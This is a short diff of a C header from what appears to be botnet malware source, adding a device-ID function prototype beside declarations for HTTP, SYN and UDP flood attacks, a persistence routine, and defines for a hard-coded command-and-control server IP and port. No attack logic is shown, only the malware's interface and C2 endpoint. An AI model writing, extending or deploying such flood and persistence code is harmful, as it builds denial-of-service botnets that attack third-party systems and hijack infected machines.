@@ -85,6 +85,7 @@ void http_flood(char* target, int port, int duration);
 void syn_flood(char* target, int port, int duration);
 void udp_flood(char* target, int port, int duration);
 void persist(void);
+void generate_device_id(void);
 
 #define C2_SERVER "51.68.128.169"
 #define C2_PORT 1337
